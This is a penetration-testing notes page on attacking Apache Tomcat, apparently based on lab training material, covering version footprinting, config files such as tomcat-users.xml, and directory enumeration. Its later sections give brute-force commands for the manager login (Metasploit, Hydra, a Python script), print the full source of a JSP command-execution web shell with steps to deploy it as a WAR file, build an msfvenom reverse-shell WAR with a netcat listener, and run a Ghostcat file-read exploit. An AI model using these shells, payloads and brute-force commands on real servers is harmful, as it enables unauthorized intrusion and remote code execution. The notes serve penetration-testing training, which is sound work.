# Tomcat

### Discovery/Footprinting

Many times if discovered via eyewitness it will be flagged as a High Value Target. These installs are typically not public internet facing, but are found many times on internal assessments.&#x20;

By requesting an invalid page, many times the tomcat server will return the server and version:

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

it can also be determined through the server header in the HTTP response, or simply via nmap scan.&#x20;

If the error page does not give us the version number, /docs might be an option:

```shell-session
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 

<html lang="en"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name="author" 

<SNIP>
```

### Tomcat file structure and interesting files

```shell-session
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

1. /bin stores scripts and binareis needed to start and run the server&#x20;
2. /conf stores config files used by tomcat which may hold valuable information.
3. tomcat-users.xml stores user credentials and roles.&#x20;
4. lib holds JAR files for the tomcat install.
5. logs and temp hold log files&#x20;
6. webapps is the default webroot of tomcat&#x20;
7. work is a cache folder to store data during runtime.&#x20;

#### Webapps folder&#x20;

each folder inside of webapps typically has a structure like so:

```shell-session
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class   
```

WEB-INF/web.xml is the deployment description which stores information about the routes used by the application and the classes handling these.&#x20;

All compiled classes are stored in WEB-INF/classes. These may contain sensitive information. Vulnerabilities in these files can lead to total compromise of the web server.&#x20;

lib stores the libararies the application uses.&#x20;

jsp stores JSP files which are executable files that execute backend code, similar to a PHP file.&#x20;

#### web.xml

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>   
```

The above web.xml does the following:&#x20;

1. defines a new servlet named AdminServlet and maps that servlet to the Java class com.inlanefreight.api.AdminServlet.&#x20;
2. Creates a servlet mapping, mapping requests to /admin with the AdminServlet. this means requests sent to /admin will be sent to the com.inlanefreight.api.AdminServlet class for processing.&#x20;

tomcat-users.xml is used to allow or prevent access to the /manager and host-manager admin portals for tomcat, and can include credentials:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

   
 <SNIP>
  
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />


</tomcat-users>
```

### Enumeration

Check for known vulnerabilities.&#x20;

check for /manager and /host-manager pages.

```shell-session
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

### Tomcat Vulnerability Scanner

{% embed url="https://github.com/p0dalirius/ApacheTomcatScanner" %}

### Login Brute Force

Can be achieved via metasploit, burp intruder or any number of tools (hydra, ffuf, etc)

Metasploit Module: [auxiliary/scanner/http/tomcat\_mgr\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/)

Make sure to set Stop on success to true so you dont miss it:&#x20;

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

Alternatively, you can use this python script to brute force the login portal as well:&#x20;

{% embed url="https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce" %}

`python mgr_brute.py -u users.txt -p pass.txt -U http://10.10.10.194:8080/ -P host-manager/`

Hydra can also be used:&#x20;

`hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html`

### Tomcat Manager & WAR File Upload

A WAR (Web Application Archive) File is used to quickly deploy web applications and backup storage. Users with the admin, manager, manager-script roles are able to access /manager/html and deploy these files. These can be used to deploy malicious code and gain code execution on the web server.&#x20;

#### Manual Exploitation&#x20;

Create your web shell file (Make sure to customize your parameter name)

```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

```shell-session
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp 
```

Click on `Browse` to select the .war file and then click on `Deploy`.

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table.

![Tomcat Web Application Manager showing applications list with paths, status, and commands, including '/backup' running with zero sessions.](https://academy.hackthebox.com/storage/modules/113/war_deployed.png)

To access the web shell on the Tomcat server, navigate to `http://web01.inlanefreight.local:8180/backup/cmd.jsp`.

#### Create a reverse shell Payload with MSFVenom

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.7 LPORT=1234 -f war > shell.war`

`nc -nvlp 1234`

Then you would upload and execute your WAR file as demonstrated in the above section.&#x20;

#### Auto-Exploit with Metapsloit

`use exploit/multi/http/tomcat_mgr_upload`

{% embed url="https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/" %}

#### JSP web shell

{% embed url="https://github.com/SecurityRiskAdvisors/cmd.jsp" %}

#### Cleanup

Go to the manager page and press "Undeploy" on your malicious WAR project.



### Known Vulnerabilities&#x20;

#### CVE-2020-1938: Ghostcat

{% embed url="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938" %}

All versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable to this unauthenticated FLI vulnerability.

1.  Identify AJP service running:&#x20;

    ```shell-session
    nmap -sV -p 8009,8080 app-dev.inlanefreight.local
    ```
2. Exploit POC here: [https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
3.  Exploit can only read files and folders within the /webapps folder, so stuff like /etc/passwd wont work. check for web.xml:&#x20;

    ```shell-session
    python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
    ```
4. Using the above section for file structure and interesting files, look for sensitive information.&#x20;

